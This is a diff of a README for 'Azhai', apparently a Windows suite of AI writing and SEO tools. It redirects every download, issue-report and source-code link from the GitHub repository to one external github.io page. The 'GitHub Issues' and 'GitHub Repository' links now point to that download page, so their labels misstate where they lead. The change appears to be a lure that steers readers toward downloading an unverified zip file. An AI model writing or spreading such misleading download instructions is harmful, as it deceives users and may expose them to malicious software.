@@ -2,7 +2,7 @@
 
 Visit this link to download the application.
 
-[![Download Now](https://img.shields.io/badge/Download%20Azhai-blue?style=for-the-badge&logo=github)](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Azhai-blue?style=for-the-badge&logo=github)](https://abdelstarrajamec-max.github.io)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Azhai is a free suite of 31+ AI text and SEO utilities. It helps you write bette
 
 To get started, follow these steps:
 
-1. Visit the download page: [https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases)
+1. Visit the download page: [https://abdelstarrajamec-max.github.io](https://abdelstarrajamec-max.github.io)
 2. Look for the latest release. It will be shown at the top.
 3. Click on the file named "azhai-ai-writing-seo-hub.zip" or similar.
 4. The download will start automatically. Wait for it to finish.
@@ -107,9 +107,9 @@ Azhai runs on any modern Windows computer with:
 
 ## 🔗 Quick Links
 
-- Download: [https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases)
-- Report Issues: [GitHub Issues](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/issues)
-- Source Code: [GitHub Repository](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub)
+- Download: [https://abdelstarrajamec-max.github.io](https://abdelstarrajamec-max.github.io)
+- Report Issues: [GitHub Issues](https://abdelstarrajamec-max.github.io)
+- Source Code: [GitHub Repository](https://abdelstarrajamec-max.github.io)
 
 ## 🙋 FAQ
 
